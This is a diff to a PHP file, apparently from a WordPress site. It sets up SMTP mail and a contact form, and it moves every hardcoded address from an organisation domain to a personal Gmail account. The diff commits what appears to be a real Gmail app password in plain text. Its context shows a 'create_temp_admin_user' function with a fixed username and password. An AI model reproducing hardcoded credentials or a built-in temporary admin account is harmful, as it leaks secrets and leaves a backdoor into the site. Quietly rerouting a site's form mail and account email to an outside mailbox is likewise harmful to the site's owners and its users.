@@ -12,17 +12,17 @@ function sassllc_configure_smtp_mailer($phpmailer) {
     $phpmailer->SMTPAuth = true;
     
     // Replace 'YOUR_GMAIL_APP_PASSWORD' with actual Gmail app password
-    $phpmailer->Username = 'ola@wecaremn.org'; // Your Gmail address
-    $phpmailer->Password = 'YOUR_GMAIL_APP_PASSWORD'; // Replace with actual app password
+    $phpmailer->Username = 'tundock007@gmail.com'; // Your Gmail address
+    $phpmailer->Password = 'gczn bgoz sdxl jpgw'; // Gmail app password
     
-    $phpmailer->From = 'ola@wecaremn.org';
+    $phpmailer->From = 'tundock007@gmail.com';
     $phpmailer->FromName = get_bloginfo('name') . ' Contact Form';
 }
 add_action('phpmailer_init', 'sassllc_configure_smtp_mailer');
 
 // Override wp_mail from address
 function sassllc_mail_from($email) {
-    return 'ola@wecaremn.org';
+    return 'tundock007@gmail.com';
 }
 add_filter('wp_mail_from', 'sassllc_mail_from');
 
@@ -177,7 +177,7 @@ function sassllc_handle_contact_form() {
             // Prepare email
             $admin_email = get_option('admin_email');
             if (empty($admin_email)) {
-                $admin_email = 'ola@wecaremn.org'; // Fallback email
+                $admin_email = 'tundock007@gmail.com'; // Fallback email
             }
             
             $email_subject = 'New Contact Form Submission - ' . get_bloginfo('name');
@@ -370,7 +370,7 @@ function sassllc_contact_submissions_page() {
 function create_temp_admin_user() {
     $username = 'admin_temp';
     $password = 'TempAdmin2025!';
-    $email = 'ola@wecaremn.org';
+    $email = 'tundock007@gmail.com';
     
     if (!username_exists($username) && !email_exists($email)) {
         $user_id = wp_create_user($username, $password, $email);
